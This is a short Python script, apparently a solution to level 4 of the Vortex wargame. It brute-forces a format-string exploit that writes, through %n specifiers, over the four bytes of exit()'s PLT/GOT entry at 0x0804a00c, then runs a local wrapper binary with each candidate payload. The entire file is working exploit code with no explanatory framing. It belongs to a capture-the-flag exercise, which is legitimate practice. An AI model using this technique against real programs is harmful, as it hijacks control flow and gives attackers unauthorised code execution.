import subprocess

''' 
Script to pass the format string and address to be overwritten to
the vortex 4 wrapper binary
'''

# 4 bytes to be modified (address of exit() in .plt - 0x0804a00c)
addr =  "\x0c\xa0\x04\x08" + \
        "\x0d\xa0\x04\x08" + \
        "\x0e\xa0\x04\x08" + \
        "\x0f\xa0\x04\x08"

# Read it, after many trial and errors
#fmt = "AAAABBBBCCCCDDDD..." + "%106$x%107$x%108$x%109$x"

for i in range(1, 255):
        for j in range(1, 255):
                fmt = addr + "" + \
                "%107$n%5$0" + str(i) + "d" + \
                "%108$n%5$0" + str(j) + "d" + \
                "%109$n" + \
                "%110$n"
                print "%d %d fmt: %s: " % (i, j, fmt)
                p = subprocess.Popen(['/tmp/myl4', fmt])
                
                p.wait()
                # Ctrl-D to continue
